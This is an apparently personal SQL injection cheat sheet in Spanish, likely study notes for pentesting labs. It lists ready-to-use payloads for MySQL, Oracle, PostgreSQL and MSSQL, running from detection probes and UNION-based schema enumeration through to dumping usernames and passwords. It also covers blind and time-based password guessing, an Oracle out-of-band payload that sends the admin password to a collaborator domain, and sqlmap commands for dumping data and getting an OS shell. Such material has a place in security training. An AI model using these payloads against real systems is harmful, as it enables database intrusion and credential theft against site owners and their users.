---

### 💥 **SQL Injection Cheat Sheet** 💥

---
---
## **Deteccion**  

```sql
'
"
'%3b select sleep(5)--
' or sleep(5)--
'||pg_sleep(5)--
'; waitfor delay '0:0:5'--
```
--- 
## Payloads 

```sql
poc.js'+(select*from(select(sleep(40)))a)+'.pdf

```


---
# **SQLi**  

## **Fase 1: Descubrimiento de Columnas con `ORDER BY`**  

Para determinar el número de columnas en la consulta SQL, se usa la cláusula **`ORDER BY`**:  
```sql
id=3' order by 100-- -
```
- **Si no da error:** El número de columnas es mayor o igual a 100.  
- **Si da error:** El número de columnas es menor a 100.  
- **Ajustar el número hasta encontrar el límite exacto.**  

---

## **Fase 2: Exploración con `UNION SELECT`**  

Una vez conocida la cantidad de columnas, intentamos combinar los resultados de la consulta original con los nuestros:  
**MySQL y Microsoft**
```sql
id=3' union select 1--+-
id=3' union select NULL,2,@@version--+-

```
**Oracle**
```sql

id=3' union select NULL,NULL FROM DUAL-- 
id=3' union select 'a','b' FROM DUAL-- 
id=3' union select 'a',banner from v$version--
```
Esto debería mostrar el valor `1` en la columna inyectada si la consulta es exitosa.  

---

## **Fase 3: Enumeración de Bases de Datos**  

Para listar todas las bases de datos:  
**MySQL**
```sql
id=32' union select schema_name from information_schema.schemata-- -
```
- **`schema_name`:** Columna que contiene los nombres de las bases de datos.  
- **`information_schema`:** Esquema especial que almacena metadatos.  
- **`schemata`:** Tabla que contiene los nombres de las bases de datos.  
**Oracle**
---

## **Concatenación con `group_concat()`**  
Si el resultado está limitado, usamos la función **`group_concat()`**:  
```sql
id=32' union select group_concat(schema_name) from information_schema.schemata-- -
```
También podemos usar **`LIMIT`** para obtener resultados específicos:  
```sql
id=32' union select schema_name from information_schema.schemata limit 0,1-- -
```

---

## **Fase 4: Enumeración de Tablas**  

Para listar todas las tablas dentro de una base de datos:  
**MySQL**
```sql
id=32' union select group_concat(table_name) from information_schema.tables where table_schema='Hack4u'-- -
```
**Oracle**
```sql
id=32' union select NULL,table_name from all_tables-- -
```


---

## **Fase 5: Enumeración de Columnas**  

Para listar todas las columnas dentro de una tabla específica:  
**MySQL**
```sql
id=32' union select group_concat(column_name) from information_schema.columns where table_schema='Hack4u' and table_name='users'-- -
```
**Oracle**
```sql
id=32' union select NULL,column_name from all_tab_columns where table_name='table'-- -
```
---

## **Fase 6: Extracción de Datos**  
**MySQL**
Obtener los usuarios almacenados:  
```sql
id=32' union select group_concat(username) from users-- -
```

Obtener usuarios y contraseñas en conjunto:  
```sql
id=32' union select group_concat(username,':',password) from users-- -
id=32' union select NULL,group_concat(username,0x3a,password) from users-- 
id=32' union select NULL,concat(username,0x3a,password) from users-- 
id=32' union select NULL,username||':'||password from users-- 2
```

Obtener usuarios y contraseñas aprovechando errores:
*Probar siempre tambien borrando la data que habia antes*
```sql
id=32' or 1=cast((select 1) as INT)-- -
id=' or 1=cast((select password from users limit 1) as INT)-- -
```

**Oracle**
```mysql
id=32' union select username,password from users-- -
```


---
## **BSQLi**
## **Enumeracion basada en nested queries**

**MySQL**
*Enumeracion de contraeñas*
```sql
id=32' and (select substring(password,1,1) from users where username='administrator')='a'-- -
```

*Enumeracion de longitud de contraseña*
```sql
id=32' and (select 'a' from users where username='administrator' and length(password)>10)='a'-- -
```

**Oracle**
*Enumeracion de contraeñas*
```sql
id=32'||(select case when substr(password,1,1)='a' then to_char(1/0) else '' end from users where username='administrator')||'
```

*Enumeracion de longitud de contraseña*
```sql
id=32'||(select case when length(password)>20 then to_char(1/0) else '' end from users where username='administrator')||'
```

## Enumeracion basada en retrasos de tiempo

**PostgreSQL**
*Enumeracion de longitud de contraseña*
```sql
id=32'%3b select case when(username='administrator' and length(password)=20) then pg_sleep(5) else pg_sleep(0) end from users-- 
```

*Enumeracion de contraeñas*
```sql
id=32'%3b select case when(username='administrator' and substring(password,1,1)='a') then pg_sleep(5) else pg_sleep(0) end from users-- 
```

## Enumeracion basada en OOB
*Buscar los payloads en la cheat sheet de portswigger*

**Oracle**
```sql 
id=32' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select password from users where username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual-- 
```


---
## **Automatización con SQLMap**  

### **Enumeración de Bases de Datos:**
```bash
sqlmap -u 'http://localhost/searchUsers.php?id=1' --dbs --cookie "PHPSESSID=8123791283"
```

### **Listar Tablas de una Base de Datos:**
```bash
sqlmap -u 'http://localhost/searchUsers.php?id=1' --dbms mysql --batch -D Hack4u --tables
```

### **Listar Columnas de una Tabla:**
```bash
sqlmap -u 'http://localhost/searchUsers.php?id=1' --dbms mysql --batch -D Hack4u -T users --columns
```

### **Dumpear Información Sensible:**
```bash
sqlmap -u 'http://localhost/searchUsers.php?id=1' --dbms mysql --batch -D Hack4u -T users -C username,password --dump
```

### **Obtener Shell Remota:**
```bash
sqlmap -u 'http://localhost/searchUsers.php?id=1' --os-shell
```

---

## **Parámetros Útiles de SQLMap**
| Parámetro    | Descripción                                                         |
|-------------|---------------------------------------------------------------------|
| `--dbs`     | Lista todas las bases de datos.                                      |
| `--tables`  | Lista todas las tablas de una base de datos.                         |
| `--columns` | Lista todas las columnas de una tabla.                               |
| `--dump`    | Extrae los datos de la tabla especificada.                           |
| `--os-shell`| Intenta obtener una consola del sistema operativo.                   |
| `--risk`    | Nivel de riesgo (1-3).                                                |
| `--level`   | Nivel de pruebas (1-5).                                               |
| `--tech`    | Especifica técnicas de inyección.                                     |
| `--tamper`  | Usa scripts de evasión para eludir filtros WAF/IDS.                    |

---

